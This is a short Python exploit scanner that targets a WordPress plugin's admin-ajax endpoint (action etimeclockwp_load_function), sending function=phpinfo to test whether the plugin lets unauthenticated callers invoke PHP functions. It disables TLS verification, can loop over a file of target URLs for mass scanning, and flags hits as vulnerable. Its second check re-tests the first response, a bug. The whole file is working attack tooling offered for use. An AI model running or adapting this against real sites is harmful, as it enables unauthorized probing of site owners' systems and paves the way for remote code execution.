import requests
import sys
import traceback


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def test_phpinfo(url):
    """
    Test if the given URLs expose `phpinfo` via the specified POST request.
    """

    data = "function=phpinfo"
    data2 = {
    "function": "phpinfo"
    }

    headers = {"user-agent": "xxxx"}
    path = "wp-admin/admin-ajax.php?action=etimeclockwp_load_function"
    url = f"{url}{path}"

    try:
        response = requests.post(url, verify=False, headers=headers, data=data, timeout=8)
        if response.status_code == 200 and "phpinfo" in response.text:
            print(f"[VULNÉRABLE] {url} expose phpinfo().")

        response2 = requests.post(url, verify=False, headers=headers, data=data2, timeout=8)
        if response.status_code == 200 and "phpinfo" in response.text:
            print(f"[VULNÉRABLE] {url} expose phpinfo().")
    except requests.RequestException as e:
        pass
        #print(f"[ERREUR] Impossible de tester {url}: {e}")


def main(url):
    try:
        test_phpinfo(url)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        traceback.print_exc()
        pass

if __name__ == "__main__":
    if len(sys.argv) == 2:
        url = sys.argv[1]
        main(url)
    elif len(sys.argv) == 3:
        input_file = sys.argv[2]
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            main(url)
            print(f" {url}", end='\r')
    else:
        print("Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com")
